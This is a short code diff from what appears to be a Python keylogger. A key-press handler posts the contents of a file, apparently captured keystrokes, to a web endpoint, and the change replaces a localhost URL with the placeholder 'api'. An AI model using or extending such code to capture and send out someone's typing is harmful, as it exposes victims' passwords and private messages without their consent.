@@ -62,7 +62,7 @@ def on_press(key):
       'mensaje':read_file()
     }
 
-    res = requests.post('http://localhost:4040/enviar', json=dictToSend)
+    res = requests.post('api', json=dictToSend)
 
 def on_release(key):
   if key == Key.esc:
